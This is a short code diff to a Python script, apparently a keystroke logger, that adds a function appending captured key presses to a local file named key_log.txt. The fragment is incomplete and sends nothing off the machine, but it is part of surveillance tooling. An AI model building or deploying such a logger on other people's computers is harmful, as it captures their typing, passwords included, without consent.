@@ -8,7 +8,10 @@ def on_press(key):
     global count, keys
     print(key)
 
-def write_file():
+def write_file(keys):
+    with open("key_log.txt", "a") as f:
+        for key in keys:
+            f.write(key)
     
 
 def on_release(key):
